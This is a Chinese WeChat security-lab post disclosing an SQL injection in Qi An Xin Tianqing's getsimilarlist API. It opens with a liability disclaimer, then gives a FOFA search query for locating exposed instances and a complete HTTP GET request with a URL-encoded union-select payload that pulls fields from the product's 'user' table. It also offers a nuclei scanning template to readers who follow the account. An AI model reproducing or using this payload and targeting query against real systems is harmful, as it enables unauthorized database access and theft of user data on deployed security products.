#  奇安信 天擎getsimilarlist SQL注入

原创 天澜实验室 [ 天澜实验室 ](javascript:void\(0\);)

**天澜实验室** ![]()

微信号 gh_c5fea27198a7

功能介绍 观水有术，必观其澜！
专注于感知国内外常见系统的漏洞态势，对漏洞进行分析、复现、武器化形成。涵盖漏洞复现、攻防演练、应急响应、工具开发等知识内容。秉承“没有网络安全就没有国家安全”的宗旨，热衷并服务于网络安全事业。

____

___发表于_

![]()

**请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习交流使用，如若非法他用，与平台和本文作者无关，需自行负责！**

 **00**

 **漏洞概述**

![]()

奇安信 天擎 getsimilarlist接口存在SQL注入漏洞。

 **01**

 **空间搜索语法**

![]()

fofa

title="360新天擎"

![]()

 **02**

 **利用过程**

![]()

登录界面

![]()

getsimilarlist接口存在SQL注入漏洞。

  *   *   *   *   *   *   * 

    
    
    GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1 HTTP/1.1Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36Connection: closeAccept-Encoding: gzip, deflate, br  
      
    

漏洞存在响应包如下。  

![]()

 **03**

 **nuclei**

![]()

![]()

获取脚本关注本公众号后发送：天擎1原创原创原创原创原创原创原创原创原创原创原创原创原创原创原创原创创原创原创  

✓

关注我们

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 奇安信 天擎getsimilarlist SQL注入

原创 天澜实验室 [ 天澜实验室 ](javascript:void\(0\);)

轻触阅读原文

![]()

天澜实验室

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

